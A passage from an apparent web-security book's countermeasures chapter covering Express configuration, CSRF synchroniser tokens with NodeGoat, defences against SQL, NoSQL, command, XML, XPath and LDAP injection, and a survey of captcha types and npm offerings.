<code class="lineno"> 6 </code><code class="k">if</code> <code class="p">(</code><code class="nx">process</code><code class="p">.</code><code class="nx">env</code><code class="p">.</code><code class="nx">NODE_ENV</code> <code class="o">===</code> <code class="s1">'production'</code><code class="p">)</code>
<code class="lineno"> 7 </code>   <code class="nx">process</code><code class="p">.</code><code class="nx">env</code><code class="p">.</code><code class="nx">NODE_CONFIG_DIR</code> <code class="o">=</code> <code class="nx">path</code><code class="p">.</code><code class="nx">join</code><code class="p">(</code><code class="nx">__dirname</code><code class="p">,</code> <code class="s1">'config'</code><code class="p">);</code>
<code class="lineno"> 8 </code><code class="c1">// Yes the following are hoisted, but it's OK in this situation.</code>
<code class="lineno"> 9 </code><code class="kd">var</code> <code class="nx">logger</code> <code class="o">=</code> <code class="nx">require</code><code class="p">(</code><code class="s1">'./util/logger'</code><code class="p">);</code> <code class="c1">// Or use requireFrom module so no relative paths.</code>
<code class="lineno">10 </code><code class="kd">var</code> <code class="nx">methodOverride</code> <code class="o">=</code> <code class="nx">require</code><code class="p">(</code><code class="s1">'method-override'</code><code class="p">);</code>
<code class="lineno">11 </code><code class="c1">// body-parser needs to be added in the middleware stack before using</code>
<code class="lineno">12 </code><code class="c1">// express-form: https://github.com/freewil/express-form/issues/21</code>
<code class="lineno">13 </code><code class="kd">var</code> <code class="nx">bodyParser</code> <code class="o">=</code> <code class="nx">require</code><code class="p">(</code><code class="s1">'body-parser'</code><code class="p">);</code>
<code class="lineno">14 </code><code class="kd">var</code> <code class="nx">errorHandler</code> <code class="o">=</code> <code class="nx">require</code><code class="p">(</code><code class="s1">'errorhandler'</code><code class="p">);</code>
<code class="lineno">15 </code><code class="kd">var</code> <code class="nx">app</code> <code class="o">=</code> <code class="nx">express</code><code class="p">();</code>
<code class="lineno">16 </code><code class="c1">//...</code>
<code class="lineno">17 </code><code class="nx">logger</code><code class="p">.</code><code class="nx">init</code><code class="p">();</code>
<code class="lineno">18 </code><code class="nx">app</code><code class="p">.</code><code class="nx">set</code><code class="p">(</code><code class="s1">'port'</code><code class="p">,</code> <code class="nx">process</code><code class="p">.</code><code class="nx">env</code><code class="p">.</code><code class="nx">PORT</code> <code class="o">||</code> <code class="mi">3000</code><code class="p">);</code>
<code class="lineno">19 </code><code class="nx">app</code><code class="p">.</code><code class="nx">set</code><code class="p">(</code><code class="s1">'views'</code><code class="p">,</code> <code class="nx">__dirname</code> <code class="o">+</code> <code class="s1">'/views'</code><code class="p">);</code>
<code class="lineno">20 </code><code class="nx">app</code><code class="p">.</code><code class="nx">set</code><code class="p">(</code><code class="s1">'view engine'</code><code class="p">,</code> <code class="s1">'jade'</code><code class="p">);</code>
<code class="lineno">21 </code><code class="c1">//...</code>
<code class="lineno">22 </code><code class="c1">// In order to utilise connect/express logger module in our third party logger,</code>
<code class="lineno">23 </code><code class="c1">// Pipe the messages through.</code>
<code class="lineno">24 </code><code class="nx">app</code><code class="p">.</code><code class="nx">use</code><code class="p">(</code><code class="nx">morganLogger</code><code class="p">(</code><code class="s1">'combined'</code><code class="p">,</code> <code class="p">{</code><code class="nx">stream</code><code class="o">:</code> <code class="nx">logger</code><code class="p">.</code><code class="nx">stream</code><code class="p">}));</code>
<code class="lineno">25 </code><code class="nx">app</code><code class="p">.</code><code class="nx">use</code><code class="p">(</code><code class="nx">methodOverride</code><code class="p">());</code>
<code class="lineno">26 </code><code class="nx">app</code><code class="p">.</code><code class="nx">use</code><code class="p">(</code><code class="nx">bodyParser</code><code class="p">.</code><code class="nx">json</code><code class="p">());</code>
<code class="lineno">27 </code><code class="nx">app</code><code class="p">.</code><code class="nx">use</code><code class="p">(</code><code class="nx">bodyParser</code><code class="p">.</code><code class="nx">urlencoded</code><code class="p">({</code> <code class="nx">extended</code><code class="o">:</code> <code class="kc">true</code> <code class="p">}));</code>
<code class="lineno">28 </code><code class="nx">app</code><code class="p">.</code><code class="nx">use</code><code class="p">(</code><code class="nx">express</code><code class="p">.</code><code class="kr">static</code><code class="p">(</code><code class="nx">path</code><code class="p">.</code><code class="nx">join</code><code class="p">(</code><code class="nx">__dirname</code><code class="p">,</code> <code class="s1">'public'</code><code class="p">)));</code>
<code class="lineno">29 </code><code class="c1">//...</code>
<code class="lineno">30 </code><code class="nx">require</code><code class="p">(</code><code class="s1">'./routes'</code><code class="p">)(</code><code class="nx">app</code><code class="p">);</code>
<code class="lineno">31 </code>
<code class="lineno">32 </code><code class="k">if</code> <code class="p">(</code><code class="s1">'development'</code> <code class="o">==</code> <code class="nx">app</code><code class="p">.</code><code class="nx">get</code><code class="p">(</code><code class="s1">'env'</code><code class="p">))</code> <code class="p">{</code>
<code class="lineno">33 </code>   <code class="nx">app</code><code class="p">.</code><code class="nx">use</code><code class="p">(</code><code class="nx">errorHandler</code><code class="p">({</code> <code class="nx">dumpExceptions</code><code class="o">:</code> <code class="kc">true</code><code class="p">,</code> <code class="nx">showStack</code><code class="o">:</code> <code class="kc">true</code> <code class="p">}));</code>
<code class="lineno">34 </code>   <code class="c1">//...</code>
<code class="lineno">35 </code><code class="p">}</code>
<code class="lineno">36 </code><code class="k">if</code> <code class="p">(</code><code class="s1">'production'</code> <code class="o">==</code> <code class="nx">app</code><code class="p">.</code><code class="nx">get</code><code class="p">(</code><code class="s1">'env'</code><code class="p">))</code> <code class="p">{</code>
<code class="lineno">37 </code>   <code class="nx">app</code><code class="p">.</code><code class="nx">use</code><code class="p">(</code><code class="nx">errorHandler</code><code class="p">());</code>
<code class="lineno">38 </code>   <code class="c1">//...</code>
<code class="lineno">39 </code><code class="p">}</code>
<code class="lineno">40 </code>
<code class="lineno">41 </code><code class="nx">http</code><code class="p">.</code><code class="nx">createServer</code><code class="p">(</code><code class="nx">app</code><code class="p">).</code><code class="nx">listen</code><code class="p">(</code><code class="nx">app</code><code class="p">.</code><code class="nx">get</code><code class="p">(</code><code class="s1">'port'</code><code class="p">),</code> <code class="kd">function</code><code class="p">(){</code>
<code class="lineno">42 </code>   <code class="nx">logger</code><code class="p">.</code><code class="nx">info</code><code class="p">(</code>
<code class="lineno">43 </code>      <code class="s2">"Express server listening on port "</code> <code class="o">+</code> <code class="nx">app</code><code class="p">.</code><code class="nx">get</code><code class="p">(</code><code class="s1">'port'</code><code class="p">)</code> <code class="o">+</code> <code class="s1">' in '</code>
<code class="lineno">44 </code>      <code class="o">+</code> <code class="nx">process</code><code class="p">.</code><code class="nx">env</code><code class="p">.</code><code class="nx">NODE_ENV</code> <code class="o">+</code> <code class="s1">' mode'</code>
<code class="lineno">45 </code>   <code class="p">);</code>
<code class="lineno">46 </code><code class="p">});</code>
</pre></div>

</figure>

<p>As I mentioned previously in the <a href="chap06.html#web-applications-identify-risks-lack-of-input-validation-filtering-and-sanitisation-generic-what-is-validation">“What is Validation”</a> section, some of the libraries seem confused about the differences between the practises of validation, filtering and sanitisation. For example <code>express-form</code> has sanitisation functions that are under their <a href="https://github.com/freewil/express-form#filter-api">“Filter API”</a>. 
<code>entityEncode</code>, <code>entityDecode</code>, even the Type Coercion functions are actually sanitisation rather than filtering.</p>

<p>Maybe it is semantics, but <code>toFloat</code>, <code>toInt</code>, … <code>ifNull</code> are sanitisation functions.</p>

<p><code>trim</code>, … is filtering, but <code>toLower</code>, … is sanitisation again. These functions listed in the documentation under the Filter API should be in their specific sections.</p>

<p>Refer to the section <a href="chap06.html#web-applications-identify-risks-lack-of-input-validation-filtering-and-sanitisation-generic-what-is-validation">above</a> for a refresher on validation, filtering and sanitisation if you need it.</p>

<h6 id="web-applications-countermeasures-lack-of-input-validation-filtering-and-sanitisation-generic-other-things-to-think-about">Other things to think about</h6>

<ul>
  <li>Try and make all of your specific input fields conform to well structured semantic types. Like dates, social security numbers, zip codes, email addresses, etc. This way the developer should be able to define a very strong validation, filtering and sanitisation (if needed) specification for each one. Thus making the task of assuring all input is safe before it reaches any execution contexts easier.</li>
  <li>If the input field comes from a fixed set of options, like a drop down list or radio buttons, then the input needs to match exactly one of the values offered to the user in the first place.</li>
  <li>Database accounts (in fact all accounts) should use <a href="chap06.html#web-applications-countermeasures-management-of-application-secrets-least-privilege">least privilege</a>
</li>
  <li>Well structured data, like dates, social security numbers, zip codes, email addresses, etc. then the developer should be able to define a very strong validation pattern</li>
</ul>

<h5 id="web-applications-countermeasures-lack-of-input-validation-filtering-and-sanitisation-cross-site-scripting">Cross-Site Scripting (XSS)</h5>

<p>This is a place holder section. The countermeasures are covered in the <a href="chap06.html#web-applications-countermeasures-lack-of-input-validation-filtering-and-sanitisation">Lack of Input Validation, Filtering and Sanitisation</a> section.</p>

<h4 id="leanpub-auto-cross-site-request-forgery-csrf">Cross-Site Request Forgery (CSRF)</h4>

<img class="threat-tags" src="images/ThreatTags----PreventionAVERAGE.png"/>


<p>CSRF syncroniser/challenge tokens are one approach commonly used to help defend against CSRF. This approach should also be used with other techniques like Identifying the source origin by checking the Origin and Referer headers, along with other useful techniques that have been well documented by the <a href="https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)_Prevention_Cheat_Sheet">OWASP CSRF Prevention Cheat Sheet</a>. Also the <a href="https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)">OWASP CSRF</a> page has links to many useful resources, and do not forget to check the <a href="chap07.html#additional-resources-countermeasures-for-csrf">Additional Resources</a> chapter.</p>

<p>With the CSRF syncroniser/challenge token pattern, a token (often called the CSRF syncroniser/challenge token) is sent as part of a response to a legitimate request from a client browser. The application on the client side holds this syncroniser/challenge token and sends it on subsequent requests to the legitimate website.</p>

<p>The specific server side web application is responsible for generating a unique token per session and adding it to the responses. The application in the browser, or users device, is responsible for storing the syncroniser/challenge token, then issuing it with each request where CSRF is a concern.  </p>

<p>When an attacker tricks a target into issuing a fraudulent request to the same website, the request has no knowledge of the syncroniser/challenge token, so it is not sent.</p>

<p>The legitimate website will only regard a request as being legitimate if the request also carries the valid matching syncroniser/challenge token as is contained in the targets session on the server.</p>

<p>For the examples from the <a href="chap06.html#web-applications-countermeasures-lack-of-input-validation-filtering-and-sanitisation-csrf">Identify Risks</a> section:</p>

<p>The NodeGoat application deals with CSRF attacks by using an Express CSRF middleware named <code>_csrf</code> which should be added to all requests that mutate state such as discussed in the Identify Risks section. You can see this on line 67 of the <a href="chap06.html#profile_html">profile.html snippet</a> in the Identify Risks section within a hidden field. Repeated below:</p>

<figure class="code">
<div class="highlight"><pre><code></code><code class="p">&lt;</code><code class="nt">input</code> <code class="na">type</code><code class="o">=</code><code class="s">"hidden"</code> <code class="na">name</code><code class="o">=</code><code class="s">"_csrf"</code> <code class="na">value</code><code class="o">=</code><code class="s">"{{csrftoken}}"</code> <code class="p">/&gt;</code>
</pre></div>

</figure>

<p>When the form is submitted, the middleware checks for existence of the token, and validates it by matching to the generated token in the targets session. If the CSRF syncroniser/challenge token fails validation, the server rejects the requested action.</p>

<p>To enable this CSRF middleware, simply uncomment the CSRF fix in the NodeGoat <a href="https://github.com/OWASP/NodeGoat/blob/b475010f2de3d601eda3ad2498d9e6c729204a09/server.js#L108">server.js</a> file. The CSRF middleware is initialised immediately after the applications session middleware is initialised, </p>

<figure class="code">
<div class="highlight"><pre><code></code><code class="kd">var</code> <code class="nx">csrf</code> <code class="o">=</code> <code class="nx">require</code><code class="p">(</code><code class="s2">"csurf"</code><code class="p">);</code>

<code class="c1">// Enable Express csrf protection.</code>
<code class="nx">app</code><code class="p">.</code><code class="nx">use</code><code class="p">(</code><code class="nx">csrf</code><code class="p">());</code>

<code class="nx">app</code><code class="p">.</code><code class="nx">use</code><code class="p">(</code><code class="kd">function</code><code class="p">(</code><code class="nx">req</code><code class="p">,</code> <code class="nx">res</code><code class="p">,</code> <code class="nx">next</code><code class="p">)</code> <code class="p">{</code>
   <code class="c1">// Expose the csrfToken to the view.</code>
   <code class="nx">res</code><code class="p">.</code><code class="nx">locals</code><code class="p">.</code><code class="nx">csrftoken</code> <code class="o">=</code> <code class="nx">req</code><code class="p">.</code><code class="nx">csrfToken</code><code class="p">();</code> 
   <code class="nx">next</code><code class="p">();</code> 
<code class="p">});</code> 
</pre></div>

</figure>

<p>You can see and play with all this at <a href="https://nodegoat.herokuapp.com/tutorial/a8">https://nodegoat.herokuapp.com/tutorial/</a></p>

<p>Also check the “<a href="chap06.html#web-applications-countermeasures-lack-of-authentication-authorisation-session-management-securing-sessions">Securing Sessions</a>” countermeasures section along with the “<a href="chap06.html#web-applications-risks-that-solution-causes-lack-of-authentication-authorisation-and-session-management">Lack of Authentication, Authorisation and Session Management</a>” Risks that Solution Causes section for pertinent information. </p>

<p>Other techniques such as requiring the user to reauthenticate, or even providing <a href="chap06.html#web-applications-countermeasures-captcha">CAPTCHA</a>’s are often used, although I am not a fan of those techniques. I fail to see why we as developers should make our problem the users. We just need to make sure we make it hard enough for the attackers that the end user is not affected.</p>

<p>As an end user, if you make sure you invalidate your authentication by logging out or deleting your session cookies when you finish working with a website that requires authentication or move away from the browser, then the browser will be unable to send authentication as part of a CSRF attack.</p>

<h4 id="web-applications-countermeasures-injection">
  <a href="https://www.owasp.org/index.php/Top_10_2017-A1-Injection">Injection</a>
</h4>

<img class="threat-tags" src="images/ThreatTags----PreventionEASY.png"/>


<p>Usually the most effective technique for determining if/where your application is vulnerable to injection attacks is to review your code for all calls out to external resources, including interpreters, and determine whether the data you are passing is untrusted.</p>

<p>If you can avoid external interpreters altogether, then they can no longer be tricked into executing untrusted data, whether directly or indirectly from untrusted actors or even stored.</p>

<p>Use a parametrised API for the specific technology you are working with, whether it be SQL, NoSQL, execution of Operating System commands, XML, XPath, XSLT, XQuery, LDAP, etc. </p>

<p>Similarly to the <a href="chap06.html#web-applications-countermeasures-lack-of-input-validation-filtering-and-sanitisation">Lack of Input Validation, Filtering and Sanitisation</a> section, validation, filtering, sanitisation, and <a href="chap06.html#web-applications-countermeasures-lack-of-input-validation-filtering-and-sanitisation-generic-other-things-to-think-about">constraining</a> all untrusted data to well structured semantic types is also necessary. Granularly isolating and semantic typing each piece of untrusted data from the command or query allows you to tightly define constraints on what you expect each specific piece of data to conform to.</p>

<p>Keep the principle of <a href="chap06.html#web-applications-countermeasures-management-of-application-secrets-least-privilege">least privilege</a> in mind and implementation. When any attacks are successful, how much damage can they currently do? By enforcing the least amount of privileges possible for the given operation, you are minimising the possible risk.</p>

<p>Make sure the feedback and error messages that are provided on invalid input only provide the necessary detail that the user needs in order to provide correct input. Don’t provide unnecessary details on internal workings: exceptions, stack traces, etc. Make sure you capture and handle internal errors in software, rather than letting them bubble to the user interface.</p>

<h5 id="web-applications-countermeasures-sqli">SQLi</h5>

<p>There are a few options here:</p>

<ul>
  <li>Use prepared statements and/or parameterised queries with bind variables to take untrusted data if you have to deal with dynamic queries. Using bind variables not only help to diffuse SQL injection, but also improve performance by <a href="https://www.ibm.com/developerworks/library/se-bindvariables/">20 to 30 percent</a> by allowing the same execution plan to be used even though the arguments supplied may be different.</li>
  <li>Consider using parameterised Stored Procedures, but also review the code within to ensure that the parameters are being handled with semantic typing at a minimum. Concatenating parameters and the use of <code>exec()</code> within stored procedures can be prone to SQLi exploitation</li>
  <li>Read up on the <a href="https://www.owasp.org/index.php/SQL_Injection_Prevention_Cheat_Sheet">OWASP SQLi Prevention Cheat Sheet</a>
</li>
  <li>And even before any of these points above, make sure you have the generic input <a href="chap06.html#web-applications-countermeasures-lack-of-input-validation-filtering-and-sanitisation-generic">Validation, Filtering and Sanitisation</a> that we have already discussed covered, so all user input is validated, filtered and sanitised, both client and server side, before it gets anywhere near your queries</li>
  <li>ORMs, such as Hibernate with its Query Language (HQL) is not safe unless you use named parameters</li>
</ul>

<p>There are plenty of easy to find and understand resources on the inter-webs around SQLi mitigations and the countermeasures are generally very easy to implement. So now you have no excuse.</p>

<h5 id="web-applications-countermeasures-nosqli">NoSQLi</h5>

<p>Take the advice from the generic <a href="chap06.html#web-applications-countermeasures-injection">Injection</a> section.</p>

<p>For any dynamic queries, rather than piecing together strings with unvalidated user input, use prepared statements with strongly defined semantic types allowing you to use as short as possible white list of allowed characters, then follow up with filtering and sanitisation of any characters that must be allowed through.</p>

<p>Queries can be formatted in many different types of conventions depending on the type of NoSQL data store, such as <a href="https://www.owasp.org/index.php/Testing_for_NoSQL_injection#Summary">XML, JSON, LINQ, etc</a>. As well as these execution contexts, there will also be the execution contexts of the application itself before the untrusted data reaches the particular type of NoSQL data store API. This means, as discussed in the “<a href="chap06.html#web-applications-identify-risks-lack-of-input-validation-filtering-and-sanitisation-generic-what-is-sanitisation">What is Sanitisation</a>” section of the Lack of Input Validation, Filtering and Sanitisation section of Identify Risks, you must validate, filter and sanitise based on <strong>all</strong> of the execution contexts that the untrusted data may pass through. With NoSQL this is usually far more tedious.</p>

<p>Countermeasures will need to be carefully thought about once the type of NoSQL data store syntax, data model, and programming language(s) used throughout the application are thoroughly understood.</p>

<p>Ideally the NoSQL client library you decide to use will provide the logic to perform validation on characters that are dangerous in the execution context of the NoSQL library, it may also provide some filtering, but you will often have to provide some configuration to help it know what you want. Ideally the NoSQL client library will also provide sanitisation for its own execution context. As discussed above, you will still need to define your own semantic types, white lists for the semantic types, filtering and sanitisation for your application specific execution contexts that the NoSQL client library has no knowledge of. </p>

<p>In regards to <strong>MongoDB</strong> (one of the 225 + types of NoSQL data stores):</p>

<p>Server-side execution of JavaScript can be disabled by passing the <code>--noscripting</code> option on the command line or setting <a href="https://docs.mongodb.com/manual/reference/configuration-options/#security.javascriptEnabled"><code>security.javascriptEnabled</code></a> to <code>false</code> in the configuration file, which stops you executing legitimate JavaScript operations, these are not defaults, so you must read the documentation of the type of NoSQL data store you are working with. Turning JavaScript off in this manner may be quite debilitating.</p>

<p>MongoDB attempts to <a href="https://docs.mongodb.com/manual/faq/fundamentals/#how-does-mongodb-address-sql-or-query-injection">address injection</a> by using Binary JSON (<a href="http://bsonspec.org/">BSON</a>)</p>

<p>Just as the MongoDB <a href="https://docs.mongodb.com/manual/faq/fundamentals/#javascript">docs say</a>: You need to exercise care in these cases to prevent users submitting malicious JavaScript. Most queries can be expressed without JavaScript, and for those that require JavaScript, both JavaScript and non-JavaScript can be mixed into a query, placing the untrusted data into BSON fields and trusted JavaScript into the <code>$where</code> property value.</p>

<p>So in essence, make sure you read and understand your NoSQL data store documentation before building your queries.</p>

<p>Looking at the MongoDB query example from the <a href="chap06.html#web-applications-identify-risks-nosqli">Risks</a> section, the untrusted users password should be inserted to the query only after being processed by your Key Derivation Function (<a href="chap06.html#web-applications-countermeasures-data-store-compromise-which-kdf-to-use">KDF</a>), this would mitigate any JavaScript being inserted into the password property. The username should only permit alphanumeric characters.</p>

<h5 id="web-applications-countermeasures-command-injection">Command Injection</h5>

<p>On top of the points mentioned above under <a href="chap06.html#web-applications-countermeasures-lack-of-input-validation-filtering-and-sanitisation">Lack of Input Validation, Filtering and Sanitisation</a>, your greatest defence is to think through the path of where untrusted data flows, carefully considering each execution context you encounter.</p>

<p>Untrusted data should <a href="https://blog.binarymist.net/2012/12/19/javascript-coding-standards-and-guidelines/#JavaScript-evalisEvil">never be inserted</a> to <code>eval</code>, <code>setTimeout</code>, <code>setInterval</code> or as the last argument to <code>Function</code> without properly validating, filtering, and sanitising if required. It is generally <a href="https://blog.binarymist.net/2013/07/06/javascript-object-creation-patterns/#object-creation-via-constructor">not good practise</a> to use the <code>Function</code> constructor anyway. I have <a href="https://blog.binarymist.net/2011/08/17/function-declarations-vs-function-expressions/">written</a> about this on several <a href="https://blog.binarymist.net/2014/05/31/javascript-closures/#what-are-closures">occasions</a>.</p>

<p>The NodeGoat Web Application also provides a very minimal <a href="https://github.com/OWASP/NodeGoat/blob/b475010f2de3d601eda3ad2498d9e6c729204a09/app/routes/contributions.js#L30-L32">countermeasure example</a></p>

<p>If you are still constrained to using ES5 and earlier, then add <a href="https://developer.mozilla.org/en/docs/Web/JavaScript/Reference/Strict_mode"><code>use strict</code></a> mode to the beginning of your function bodies, MDN provides <a href="https://developer.mozilla.org/en/docs/Web/JavaScript/Reference/Strict_mode#Securing_JavaScript">details</a> of how it helps secure your JavaScirpt environment.</p>

<h5 id="web-applications-countermeasures-xml-injection">XML Injection</h5>

<p>First of all, as discussed in the generic <a href="chap06.html#web-applications-countermeasures-injection">Injection</a> section above, your application should validate, filter and sanitise all untrusted data before incorporating it into an XML document. If you can:</p>

<ol class="numeric">
  <li>Validate out as many XML metacharacters as possible, and sanitise those that must be accepted depending on their execution contexts. All discussed in the <a href="chap06.html#web-applications-countermeasures-lack-of-input-validation-filtering-and-sanitisation">Lack of Input Validation, Filtering and Sanitisation</a> Countermeasures section</li>
  <li>Constrain untrusted data to well structured semantic types, as discussed in the <a href="chap06.html#web-applications-countermeasures-lack-of-input-validation-filtering-and-sanitisation-generic-other-things-to-think-about">Lack of Input Validation, Filtering and Sanitisation</a> Countermeasures section</li>
</ol>

<p>Use <strong>local static</strong>: Document Type Definitions (DTDs) or better, <a href="http://www.ws-attacks.org/XML_Injection#Attack_mitigation_.2F_countermeasures">XML Schemas</a>. This will mitigate XXE attacks.</p>

<p>If the XML parser you are using is vulnerable to XXE attacks by default, investigate disabling the XML parsers ability to follow all external resource inclusions, often available by flags. If the ability to disable the following of external resource inclusions is not available, consider using an alternative library. Failing that, make sure your untrusted data is validated, filtered and sanitised by a secure parser before passing to the defective parser.</p>

<p>OWASP also has an XML External Entity (XXE) Prevention <a href="https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Prevention_Cheat_Sheet">Cheat Sheet</a> that is quite useful.</p>

<h5 id="web-applications-countermeasures-xslt-injection">XSLT Injection</h5>

<p>All <a href="https://www.owasp.org/images/a/ae/OWASP_Switzerland_Meeting_2015-06-17_XSLT_SSRF_ENG.pdf">mitigations discussed</a> and explored in the excellent paper by Emanuel Duss and Roland Bischofberger presented at an OWASP Switzerland meeting.</p>

<h5 id="web-applications-countermeasures-xpath-injection">XPath Injection</h5>

<p>Follow the precautions discussed in the generic <a href="chap06.html#web-applications-countermeasures-injection">Injection</a> countermeasures section, when handling dynamically constructed queries. A little validation of untrusted data will go a long way. For example, the username should only contain alphanumeric characters, filtering to a maximum length sometimes helps. In the case of usernames, because we have created a semantic type, it is easy to apply the white list of allowed characters to the untrusted data before inserting to your XPath query. In regards to the password, it should be the result of the untrusted user input password once processed by your Key Derivation Function (<a href="chap06.html#web-applications-countermeasures-data-store-compromise-which-kdf-to-use">KDF</a>), only then should it be inserted to your XPath query. </p>

<p>By performing some simple validation, the attacker is no longer able to escape the quotes and modify the intended logic of the query.</p>

<p>Try to use a language library that supports parameterised queries. If the language you are coding in does not have any support or libraries available that have a parameterised XPath interface, you will need to sanitise the untrusted data being inserted to any dynamically constructed queries. What ever type of quote you are using to delimit the untrusted input, you need to sanitise the same type of quote with the XML encoded derivative, I discussed this in the <a href="chap06.html#sanitisation-using-escaping">Sanitisation using escaping</a> code sample in the Types of Escaping section of Countermeasures. The OWASP <a href="https://www.owasp.org/index.php/XPATH_Injection#XPath_Injection_Defenses">XPath Injection Defences</a> also provides some coverage on this.</p>

<p>Also check the <a href="chap07.html#additional-resources-countermeasures-for-xpath-injection">Additional Resources</a> chapter for both identifying risks and countermeasures in regards to XPath injection.</p>

<h5 id="web-applications-countermeasures-xquery-injection">XQuery Injection</h5>

<p>Because XQuery is a superset of XPath with the SQL-like FLWOR expression abilities, it enjoys the same countermeasures as XPath and SQLi.</p>

<h5 id="web-applications-countermeasures-ldap-injection">LDAP Injection</h5>

<p>The same <a href="chap06.html#web-applications-countermeasures-injection">generic injection countermeasures</a> as well as many of the more specific that we have already discussed, are applicable to LDAP also.</p>

<p>As part of your validation, define your semantic types for each dynamic section, this will help you define what is accepted as the white list of allowed characters for each untrusted section. If you can tightly constrain what is an allowable character for your given semantic types, then this alone in many cases (such as a username where you would only allow alphanumeric characters for example) will stop any potential characters being able to break out of the intended context and change the logic of the LDAP query. This is why we always put the validation -&gt; filtering -&gt; sanitisation in this order, because often the first step will catch everything.</p>

<p>For each semantic type of untrusted data, for any characters that pass the white list validation, define filters, and sanitise all of the following <a href="http://www.rlmueller.net/CharactersEscaped.htm">validated characters</a>:</p>

<ul>
  <li>comma: <code>,</code>
</li>
  <li>back slash: <code>\</code>
</li>
  <li>forward slash (when used in Distinguished Names): <code>/</code>
</li>
  <li>hash: <code>#</code>
</li>
  <li>plus: <code>+</code>
</li>
  <li>less than: <code>&lt;</code>
</li>
  <li>greater than: <code>&gt;</code>
</li>
  <li>semicolon: <code>;</code>
</li>
  <li>double quote: <code>"</code>
</li>
  <li>equals: <code>=</code>
</li>
  <li>Leading or trailing spaces</li>
</ul>

<p>with their <a href="https://unicode-table.com/en/">unicode hexidesimal</a> number, such as</p>

<p>comma: \2C, back slash: \5C</p>

<p>Respect and implement the principle of <a href="chap06.html#web-applications-countermeasures-management-of-application-secrets-least-privilege">least privilege</a> as discussed in the generic injection countermeasures. Do not use administrative bind accounts in your execution environment, and apply the least privileges to the domain user service account.</p>

<p>The framework and/or libraries you use to interact with LDAP servers should sanitise untrusted data and not allow application code to directly interact with LDAP servers.</p>

<h4 id="web-applications-countermeasures-captcha">Captcha</h4>

<img class="threat-tags" src="images/ThreatTags----PreventionVERYEASY.png"/>


<h5 id="leanpub-auto-types">Types</h5>

<p> </p>

<p>
  <strong>Text Recognition</strong>
</p>

<p>recaptcha uses this technique. See below for details.</p>

<p>
  <strong>Image Recognition</strong>
</p>

<p>Uses images which users have to perform certain operations on, like dragging them to another image. For example: “Please drag all cat images to the cat mat.”, or “Please select all images of things that dogs eat.” sweetcaptcha is an example of this type of captcha. This type completely rules out the visually impaired users.</p>

<p>
  <strong>Friend Recognition</strong>
</p>

<p>Pioneered by… you guessed it. Facebook. This type of captcha focusses on human hackers, the idea being that they will not know who your friends are. </p>

<p>“<em>Instead of showing you a traditional captcha on Facebook, one of the ways we may help verify your identity is through social authentication. We will show you a few pictures of your friends and ask you to name the person in those photos. Hackers halfway across the world might know your password, but they don’t know who your friends are.</em>”</p>

<p>I disagree with that statement. A determined hacker will usually be able to find out who your friends are. There is another problem, do you know who all of your friends are? Every acquaintance? I am terrible with names and so are many people. This is supposed to be used to authenticate you. So you have to be able to answer the questions before you can log in.</p>

<p>
  <strong>Logic Questions</strong>
</p>

<p>This is what textcaptcha uses. Simple logic questions designed for the intelligence of a seven year old child. These are more accessible than image and textual image recognition, but they can take longer than image recognition to answer, unless the user is visually impared. The questions are usually language specific also, usually targeting the English language.</p>

<p>
  <strong>User Interaction</strong>
</p>

<p>This is a little like image recognition. Users have to perform actions that virtual intelligence can not work out… yet. Like dragging a slider a certain number of notches.<br />
If an offering gets popular, creating some code to perform the action may not be that hard and would definitely be worth the effort for bot creators.<br />
This is obviously not going to work for the visually impaired or for people with handicapped motor skills.</p>

<p> </p>

<p>In NPM land, as usual there are many options to choose from. The following were the offerings I evaluated. None of which really felt like a good fit:</p>

<h5 id="leanpub-auto-offerings">Offerings</h5>

<ul>
  <li>total-captcha. Depends on node-canvas. Have to install cairo first, but why? No explanation. Very little of anything here. Move on. How does this work? Do not know. What type is it? Presume text recognition.</li>
  <li>
<a href="https://www.npmjs.com/package/easy-captcha">easy-captcha</a> is a text recognition offering generating images</li>
  <li>
<a href="https://www.npmjs.com/package/simple-captcha">simple-captcha</a> looks like another text recognition offering. I really do not want to be writing image files to my server.</li>
  <li>
<a href="https://www.npmjs.com/package/node-captcha">node-captcha</a> Depends on canvas. By the look of the package this is another text recognition in a generated image.</li>
  <li>
<a href="https://www.npmjs.com/package/re-captcha">re-captcha</a> was one of the first captcha offerings, created at the Carnegie Mellon University by Luis von Ahn, Ben Maurer, Colin McMillen, David Abraham and Manuel Blum who invented the term captcha. Google later acquired it in September 2009. recaptcha is a text recognition captcha that uses scanned text that optical character recognition (OCR) technology has failed to interpret, which has the added benefit of helping to digitise text for The New York Times and Google Books.<br />
<img src="images/reCaptcha.jpg" alt="reCaptcha"/>  </li>
  <li>
<a href="https://www.npmjs.com/package/sweetcaptcha">sweetcaptcha</a> uses the sweetcaptcha cloud service of which you must abide by their terms and conditions, requires another node package, and requires some integration work. sweetcaptcha is an image recognition type of captcha.<br />
<img src="images/sweetcaptcha.jpg" alt="sweetcaptcha"/>
</li>
  <li>
<a href="http://textcaptcha.com/">textcaptcha</a> is a logic question captcha relying on an external service for the questions and md5 hashes of the correct lower cased answers. This looks pretty simple to set up, but again expects your users to use their brain on things they should not have to.</li>
</ul>

<p> </p>

<p>After some additional research I worked out why the above types and offerings didn’t feel like a good fit. It pretty much came down to user experience. Why should genuine users/customers of your web application be disadvantaged by having to jump through hoops because you have decided you want to stop bots spamming you? Would it not make more sense to make life harder for the bots rather than for your genuine users?</p>

<p>Some other considerations I had. Ideally I wanted a simple solution requiring few or ideally no external dependencies, no JavaScript required, no reliance on the browser or anything out of my control, no images and it definitely should not cost any money.</p>

<h5 id="leanpub-auto-alternative-approaches">Alternative Approaches</h5>

<ul>
  <li>Services like Disqus can be good for commenting. Obviously the comments are all stored somewhere in the cloud out of your control and this is an external dependency. For simple text input, this is probably not what you want. Similar services such as all the social media authentication services can take things a bit too far I think. They remove freedoms from your users. Why should your users be disadvantaged by leaving a comment or posting a message on your web application? Disqus tracks users activities from hosting website to website whether you have an account, are logged in or not. Any information they collect such as IP address, web browser details, installed add-ons, referring pages and exit links may be disclosed to any third party. When this data is aggregated it is useful for de-anonymising users. If users choose to block the Disqus script, the comments are not visible. Disqus has also published its registered users entire commenting histories, along with a list of connected blogs and services on publicly viewable user profile pages. Disqus also engage in add targeting and blackhat SEO techniques from the websites in which their script is installed.</li>
